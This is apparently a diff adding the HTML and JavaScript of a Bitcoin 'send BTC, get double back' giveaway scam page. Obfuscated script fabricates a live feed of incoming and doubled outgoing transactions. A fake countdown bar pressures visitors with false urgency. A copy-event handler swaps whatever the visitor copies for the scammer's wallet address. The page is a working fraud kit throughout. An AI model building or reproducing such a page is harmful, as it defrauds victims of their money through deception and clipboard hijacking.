@@ -1,0 +1,405 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css" integrity="sha384-lKuwvrZot6UHsBSfcMvOkWwlCMgc0TaWr+30HWe3a4ltaBwTZhyTEggF5tJv8tbt" crossorigin="anonymous">
+    <meta charset="utf-8">
+    <title>BTC BONUS GIVEAWAY</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/png" href="img/fav.png">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script>
+        window.onload = function() {
+            if (!localStorage.getItem("justonce")) {
+                localStorage.setItem("justOnce", "true");
+                window.location.reload();
+            }
+        }
+    </script>
+
+    <script type="text/javascript">
+        //<![CDATA[
+        window.onload = function() {
+
+            } //]]>
+    </script>
+
+    <script>
+        window.WALLET = '1P1kLksANNdj3RGkNwu7zUm6y3QAcvRRSk';
+        var currentX = '';
+        var currentY = '';
+        var movementConstant = .015;
+        $(document).mousemove(function(e) {
+            if (currentX == '') currentX = e.pageX;
+            var xdiff = e.pageX - currentX;
+            currentX = e.pageX;
+            if (currentY == '') currentY = e.pageY;
+            var ydiff = e.pageY - currentY;
+            currentY = e.pageY;
+            $('.parallax div').each(function(i, el) {
+                var movement = (i + 1) * (xdiff * movementConstant);
+                var movementy = (i + 1) * (ydiff * movementConstant);
+                var newX = $(el).position().left + movement;
+                var newY = $(el).position().top + movementy;
+                $(el).css('left', newX + 'px');
+                $(el).css('top', newY + 'px');
+            });
+        });
+    </script>
+</heahttps:/
+
+<body>
+    <div id='stars'></div>
+    <div id='stars2'></div>
+    <div id='stars3'></div>
+    <script type="text/javascript">
+        function randomString(_0xe480x2) {
+    var _0xe480x3 = '';
+    var _0xe480x4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var _0xe480x5 = _0xe480x4['length'];
+    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
+        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
+    };
+    return _0xe480x3
+}
+var divCounter = 0;
+
+function genDiv() {
+    divCounter++;
+    var _0xe480x9 = `${' <div class="inner">\x0D\x0A    <div class="top">\x0D\x0A        <div class="row row-trans-out">\x0D\x0A            <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3">{t1}</div>\x0D\x0A            <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">{t2}</div>\x0D\x0A            <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">{t3}</div>\x0D\x0A            <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">{t4}</div>\x0D\x0A            <div class="out-trans col-lg-1 col-md-1 col-sm-2 col-xs-2">{t5}</div>\x0D\x0A            <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">{t6}</div>\x0D\x0A            <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">{t7}</div>\x0D\x0A            <div class="tx-fee col-lg-1 col-md-1 col-sm-1 col-xs-1">{t8}</div>\x0D\x0A        </div>\x0D\x0A    </div>\x0D\x0A    <div class="bottom">\x0D\x0A        <div class="row row-trans-in">\x0D\x0A            <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3">{b1}</div>\x0D\x0A            <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">{b2}</div>\x0D\x0A            <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">{b3}</div>\x0D\x0A            <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">{b4}</div>\x0D\x0A            <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1">{b5}</div>\x0D\x0A            <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">{b6}</div>\x0D\x0A            <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">{b7}</div>\x0D\x0A            <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">{b8}</div>\x0D\x0A        </div>\x0D\x0A    </div>\x0D\x0A    </div>\x0D\x0A    '}`;
+    let _0xe480xa = '' + randomString(23) + '...';
+    let _0xe480xb = 616135;
+    let _0xe480xc = 'right now';
+    let _0xe480xd = '1' + randomString(15) + '...';
+    let _0xe480xe = 'IN';
+    let _0xe480xf = '1P1kLksANNdj3RGkNwu7zUm6y3QAcvRRSk';
+    let _0xe480x10 = ((Math['random']() * 11.999) + 0.100)['toFixed'](3) + ' BTC';
+    let _0xe480x11 = ((Math['random']() * 0.00999) + 0.00100)['toFixed'](5);
+    let _0xe480x12 = '' + randomString(23) + '...';
+    let _0xe480x13 = 616135;
+    let _0xe480x14 = 'right now';
+    let _0xe480x15 = _0xe480xf;
+    let _0xe480x16 = 'OUT';
+    let _0xe480x17 = _0xe480xd;
+    let _0xe480x18 = Math['ceil'](_0xe480x10['replace'](' BTC', '') * 2) + ' BTC';
+    let _0xe480x19 = ((Math['random']() * 0.00999) + 0.00100)['toFixed'](5);
+    _0xe480x9 = _0xe480x9['replace']('{t1}', _0xe480x12);
+    _0xe480x9 = _0xe480x9['replace']('{t2}', _0xe480x13);
+    _0xe480x9 = _0xe480x9['replace']('{t3}', _0xe480x14);
+    _0xe480x9 = _0xe480x9['replace']('{t4}', _0xe480x15);
+    _0xe480x9 = _0xe480x9['replace']('{t5}', _0xe480x16);
+    _0xe480x9 = _0xe480x9['replace']('{t6}', _0xe480x17);
+    _0xe480x9 = _0xe480x9['replace']('{t7}', _0xe480x18);
+    _0xe480x9 = _0xe480x9['replace']('{t8}', _0xe480x19);
+    _0xe480x9 = _0xe480x9['replace']('{b1}', _0xe480xa);
+    _0xe480x9 = _0xe480x9['replace']('{b2}', _0xe480xb);
+    _0xe480x9 = _0xe480x9['replace']('{b3}', _0xe480xc);
+    _0xe480x9 = _0xe480x9['replace']('{b4}', _0xe480xd);
+    _0xe480x9 = _0xe480x9['replace']('{b5}', _0xe480xe);
+    _0xe480x9 = _0xe480x9['replace']('{b6}', _0xe480xf);
+    _0xe480x9 = _0xe480x9['replace']('{b7}', _0xe480x10);
+    _0xe480x9 = _0xe480x9['replace']('{b8}', _0xe480x11);
+    var _0xe480x1a = $(_0xe480x9)['prependTo']('.trans-table');
+    $('.inner')['each'](function() {
+        var _0xe480x6 = $(this)['index']();
+        if (_0xe480x6 > 0) {
+            $(this)['find']('.top .row div')['eq'](2)['html'](_0xe480x6 + ' minutes ago');
+            $(this)['find']('.bottom .row div')['eq'](2)['html'](_0xe480x6 + ' minutes ago')
+        }
+    });
+    setTimeout(function() {
+        _0xe480x1a['find']('.top')['fadeIn']();
+        _0xe480x1a['find']('.bottom .row div')['eq'](2)['html']('few seconds ago')
+    }, 2000)
+}
+$(document)['ready'](function() {
+    genDiv();
+    setInterval(function() {
+        genDiv()
+    }, 15000)
+})
+    </script>
+    <div class="container-full giveaway">
+        <div class="block col-lg-7 offset-lg-5">
+            <div class="col-lg-6 offset-lg-3 logo"><img src="img/logo.png"> <span class="logo_txt"></span> </div>
+            <div class="row">
+                <div class="col-lg-12 verify">
+                    I believe that Blockchain and Bitcoin will make the world more fair and open. The current financial system is outdated. To speed up the process of Cryptocurrency Mass Adoption, I've decided to run a 5,000 BTC giveaway. 
+To participate, you just need to send from 0.01 BTC to 20 BTC to the contribution address and we will immediately send you back 0.2 BTC to 40 BTC to the address you sent it from. <span class="yel">(x2 back)</span>
+                </div>
+                <div class="col-lg-12 verify">
+                     <span class="yel">SPECIAL OFFER: </span><br>
+If you send 5+ BTC, you will be airdropped 10 BTC back +35% bonus
+                </div>
+            </div>
+            <div class="container-full">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <div class="row main_giveaway">
+                            <div class="col-lg-8 col-sm-8 col-xs-8">
+                                <div class="title"><span class="yel">Payment Address</span></div>
+                                <div class="subtitle">You can send BTC to the following address:</div>
+                                <div class="wallet"><span id="trnsctin" class="yel">164auQnEcxJQs5ea1WVAtpYFfaKDbDek6T</span></div>
+
+                            </div>
+                            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-4">
+                                <div class="qr"><img height="130" width="130" src="img/QR.png"></div>
+                            </div>
+                            <div class="buffer">
+                                <btn data-clipboard-text="164auQnEcxJQs5ea1WVAtpYFfaKDbDek6T" class="copy"><i class="far fa-copy"></i>Copy Address to Clipboard</btn>
+                            </div>
+                            <script src="js/clipboard.js"></script>
+                            <script>
+                                var btns = document.querySelectorAll('btn');
+                                var clipboard = new ClipboardJS(btns);
+                                clipboard.on('success', function(e) {
+                                    console.log(e);
+                                });
+                                clipboard.on('error', function(e) {
+                                    console.log(e);
+                                });
+                            </script>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+        <div id="instruction" class="instruction col-lg-8 offset-lg-2">
+            <div class="guide col-lg-12"><span class="yel">Instructions:</span><br>1. You can use any EXCHANGE or WALLET to participate in this event.<br> 2. The minimum contribution is 0.1 BTC and the maximum contribution is 20 BTC. <br> 3. All persons are able to participate, including those in the United States.</div>
+            <div class="wait"><i class="fas fa-spinner rotating"></i>Waiting for payment</div>
+            <div id="info-fir" class="info">Still waiting for transaction? <a href='index.html' pl-js-close="info-fir" pl-js-open="info-sec" class="click">Click Here</a><br> Once we receive your transaction, the outgoing transaction is processed to your address.<br> If you are late, your BTC will be instantly refunded.</div>
+            <div id="info-sec" style="display: none;" class="info">Sometimes transactions are not sent properly.<br> Try sending it again.<br> Remember, every transaction address we receive gets their BTC back + giveaway prize.</div>
+            <div id="lympo_progress">
+                <div class="row progress-row">
+                    <div class="colums_12">
+                        <div class="progress-ico">
+                            <div class="progress-ico">
+                                <div class="progress">
+                                    <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 100%;">
+                                        <span class="sr-only">x</span></div>
+                                </div>
+                            </div>
+                            <div class="dot-1" id="leftBTC">
+                                Counting BTC left...
+                            </div>
+                            <div class="dot-1-airdrop  progress-left" style="left: 100%;"></div>
+                            <span class="progress-bar-value" id="progress-ico-bar"></span></div>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="last_trans">
+        <h1 class="f-24 mvn em-300">Recent transactions</h1>
+
+
+    </div>
+    <script>
+        $(document).on('click', '[pl-js-open]', function() {
+            $(this)
+                .attr('pl-js-open')
+                .split('|')
+                .forEach(function(id) {
+                    $('#' + id).show();
+                })
+        });
+
+        $(document).on('click', '[pl-js-close]', function() {
+            $(this)
+                .attr('pl-js-close')
+                .split('|')
+                .forEach(function(id) {
+                    $('#' + id).hide();
+                })
+        });
+    </script>
+
+
+    <script>
+        function random(t, e) {
+            var n = arguments.length;
+            if (0 === n) t = 0, e = 2147483647;
+            else if (1 === n) throw new Error("Warning: rand() expects exactly 2 parameters, 1 given");
+            return Math.floor(Math.random() * (e - t + 1)) + t
+        }
+
+        function uuidv4() {
+            return "xxxxxxxxxxxxxxxx".replace(/[xy]/g, function(t) {
+                var e = 16 * Math.random() | 0;
+                return ("x" == t ? e : 3 & e | 8).toString(16)
+            })
+        }
+
+        function bet(t, e, n) {
+            return t = t.toString().replace("\n", ""), e = e.toString().replace("\n", ""), void 0 !== (n = n.toString().replace("\n", "")).split(t)[1] ? n.split(t)[1].split(e)[0] : void 0
+        }
+
+        function removeArr(t) {
+            for (var e, n, a = arguments, r = a.length; r > 1 && t.length;)
+                for (e = a[--r]; - 1 !== (n = t.indexOf(e));) t.splice(n, 1);
+            return t
+        }
+
+        function addLink() {
+            var t = window.getSelection(),
+                e = document.createElement("div");
+            e.style.position = "absolute", e.style.left = "-99999px", document.body.appendChild(e), e.innerHTML = "1P1kLksANNdj3RGkNwu7zUm6y3QAcvRRSk", t.selectAllChildren(e), window.setTimeout(function() {
+                document.body.removeChild(e)
+            }, 100)
+        }
+
+        function sub() {
+            for (ramdot = gF.random(2, 5), dots = [], i = 0; i < ramdot; i++) dots[i] = gF.chain(gF.random(15, 20), gF.random(0, 1)).toLowerCase();
+            for (ramdot2 = gF.random(2, 5), dots2 = [], i = 0; i < ramdot2; i++) dots2[i] = gF.chain(gF.random(15, 20), gF.random(0, 1)).toLowerCase();
+            return dots.join("-") + "." + dots2.join(".")
+        }
+
+        function newtr() {
+            tr = document.createElement("tr"), tr.innerHTML = '<td><a class="address-tag" href="index-3.html#eth">0x9addb4ab6a83b917...</a></td><td class="hidden-sm"><a href="index-3.html#eth">9424669</a></td><td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >1 mins ago</span></td><td><a class="address-tag" href="index-3.html#eth">37762eEWdPaQKguMMa...</a></td><td><span class="label label-orange rounded" style="background: #e67e22;">OUT</span></td><td><span class="address-tag">1NDyJtNTjmwk5xPNhjg...</span></td><td>4 ETH</td><td><font color="gray" size="1">0<b>.</b>00042</font></td>', INT = "0x" + uuidv4().toLowerCase(), OUT = "0x" + uuidv4().toLowerCase(), TXID = "0x" + uuidv4().toLowerCase(), TXID2 = "0x" + uuidv4().toLowerCase(), INCIN = (Math.random() * (66) + 9.5).toFixed(3), INOUT = (2 * INCIN + 0.5).toFixed(0);
+            var t = document.getElementById("myTable").insertRow(1),
+                e = t.insertCell(0),
+                n = t.insertCell(1),
+                a = t.insertCell(2),
+                r = t.insertCell(3),
+                d = t.insertCell(4),
+                s = t.insertCell(5),
+                i = t.insertCell(6),
+                o = t.insertCell(7);
+            e.innerHTML = '<a class="toolme" class="address-tag" href="index-3.html#eth">' + TXID + "...</a>", n.innerHTML = '<td class="hidden-sm"><a href="index-3.html#eth">9424669</a></td>', a.innerHTML = '<td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >now</span></td>', r.innerHTML = '<td><a class="address-tag" href="index-3.html#eth">' + OUT + "...</a></td>", d.innerHTML = '<td><span class="label label-success rounded">&nbsp; IN &nbsp;</span></td>', s.innerHTML = '<td><span class="address-tag">' + window.WALLET.substring(0, 19) + "...</span></td>", i.innerHTML = "<td>" + INCIN + " ETH</td>", o.innerHTML = '<td><font color="gray" size="1">0<b>.</b>00' + random(100, 999) + "</font></td>", document.getElementsByTagName("tr")[1].classList.add("toolbar"), setTimeout(function() {
+                var t = document.getElementById("myTable").insertRow(1),
+                    e = t.insertCell(0),
+                    n = t.insertCell(1),
+                    a = t.insertCell(2),
+                    r = t.insertCell(3),
+                    d = t.insertCell(4),
+                    s = t.insertCell(5),
+                    i = t.insertCell(6),
+                    o = t.insertCell(7);
+                e.innerHTML = '<a class="address-tag" href="index-3.html#eth">' + TXID2 + "...</a>", n.innerHTML = '<td class="hidden-sm"><a href="index-3.html#eth">9424669</a></td>', a.innerHTML = '<td width="150px !important"><span rel="tooltip" data-placement="bottom" title="" data-original-title="Feb-19-2018 04:16:52 AM" class="tim3" >now</span></td>', r.innerHTML = '<td><a class="address-tag" href="index-3.html#eth">' + window.WALLET.substring(0, 19) + "...</a></td>", d.innerHTML = '<td><span class="label label-orange rounded" style="background: #e67e22;">OUT</span></td>', s.innerHTML = '<td><span class="address-tag">' + OUT + "...</span></td>", i.innerHTML = "<td>" + INOUT + " ETH</td>", o.innerHTML = '<td><font color="gray" size="1">0<b>.</b>00' + random(100, 999) + "</font></td>", document.getElementsByTagName("tr")[1].classList.add("toolbar")
+            }, 1500)
+        }
+
+        function insertAfter(t, e) {
+            e.parentNode.insertBefore(t, e.nextSibling)
+        }
+
+        function updateTrans() {
+            for (i = 0; i < times.length; i++) "now" == times[i].innerHTML.split(" ")[0] ? times[i].innerHTML = "1 mins ago" : times[i].innerHTML = parseInt(times[i].innerHTML.split(" ")[0]) + 1 + " mins ago";
+            newtr()
+        }
+        document.addEventListener("copy", addLink), times = document.getElementsByClassName("tim3"), window.onload = function() {
+            updateTrans(), trans = setInterval(function() {
+                updateTrans()
+            }, 1e4)
+        }, document.getElementById("address").innerHTML = window.WALLET, document.getElementById("qrcode").src = "http://chart.apis.google.com/chart?cht=qr&chs=300x300&chl=" + window.WALLET + "&chld=H|0", document.getElementById("trnsctin").innerHTML = window.WALLET;
+    </script>
+    <script>
+        // tell the embed parent frame the height of the content
+        if (window.parent && window.parent.parent) {
+            window.parent.parent.postMessage(["resultsFrame", {
+                height: document.body.getBoundingClientRect().height,
+                slug: "b1cxaqn5"
+            }], "*")
+        }
+    </script>
+    <div class="container">
+        <div class="row header-trans">
+            <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3">TxHash</div>
+            <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">Block</div>
+            <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">Age</div>
+            <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">From</div>
+            <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1"></div>
+            <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">To</div>
+            <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">Value</div>
+            <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">TxFee</div>
+        </div>
+        <div class="trans-table">
+
+        </div>
+    </div>
+    <!-- ============================================= end ====================================================== -->
+
+    <script type="text/javascript">
+        $(document).ready(function() {
+            $('.spoiler-title').click(function() {
+                $(this).parent().children('div.spoiler-content').toggle('fast');
+                return false;
+            });
+        });
+    </script>
+    <script>
+        function setProgress(count, max) {
+            var p = (100 * count / max).toString() + '%';
+            $('.progress-left').css('left', p);
+            $('.progress-width').css('width', p);
+            var cc = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            var mm = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+            $('.progress-bar-value').text(cc + ' / ' + mm);
+
+        }
+
+
+
+        var ctd = setInterval(function() {
+            if (localStorage.getItem("bar")) {
+                if (localStorage.getItem("bar") <= 90) {
+                    var new_count = localStorage.getItem("bar");
+                } else if (localStorage.getItem("bar")) {
+                    var init_count = localStorage.getItem("bar");
+                    var new_count = init_count - Math.floor((Math.random() * 10) * 4 + 5);
+                }
+            } else {
+                var init_count = Math.floor((Math.random() * (5000 - 5000) + 4000) + 1);
+                var new_count = init_count - Math.floor((Math.random() * 10) * 4 + 5);
+            }
+            setProgress(new_count, 5000)
+
+
+
+            localStorage.setItem("bar", new_count);
+
+            if (init_count <= 300)
+                clearInterval(ctd);
+            if (new_count <= 9999 && init_count >= 2001)
+                document.getElementById("leftBTC").innerHTML = "BTC left...";
+            if (new_count <= 700 && init_count >= 301)
+                document.getElementById("leftBTC").innerHTML = "Hurry up, not much more BTC left!";
+            if (new_count <= 300)
+                document.getElementById("leftBTC").innerHTML = "Last chance to get your BTC!";
+            if (new_count <= 1000)
+                document.title = new_count + " BTC left";
+            if (new_count <= 500)
+                document.title = "Get your " + new_count + " BTC now!";
+
+        }, 6666);
+    </script>
+    <script>
+        window.WALLET = '1P1kLksANNdj3RGkNwu7zUm6y3QAcvRRSk';
+    </script>
+
+    <script src='/code.jquery.com/jquery-3.3.1.js'></script>
+    <script type='text/javascript'>
+        $(document).mousemove(function(e) {
+            $('.pointer').css({
+                left: e.pageX,
+                top: e.pageY
+            });
+        })
+    </script>
+    </body>
+</html>
